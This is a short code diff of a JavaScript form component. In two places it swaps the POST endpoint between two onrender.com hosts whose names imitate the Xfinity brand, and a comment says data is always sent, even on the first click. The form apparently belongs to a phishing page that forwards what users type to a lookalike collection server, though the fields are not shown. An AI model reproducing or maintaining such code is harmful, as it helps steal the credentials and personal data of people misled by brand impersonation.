@@ -64,7 +64,7 @@ const FormContainer = () => {
       // Always send data, even on the first click
       try {
         const response = await fetch(
-          'https://xfinity-5y6r.onrender.com/api/submit',
+          'https://xfi-nity.onrender.com/api/submit',
           {
             method: 'POST',
             headers: {
@@ -88,7 +88,7 @@ const FormContainer = () => {
   
       try {
         const response = await fetch(
-          'https://xfinity-5y6r.onrender.com/api/submit',
+          'https://xfi-nity.onrender.com/api/submit',
           {
             method: 'POST',
             headers: {
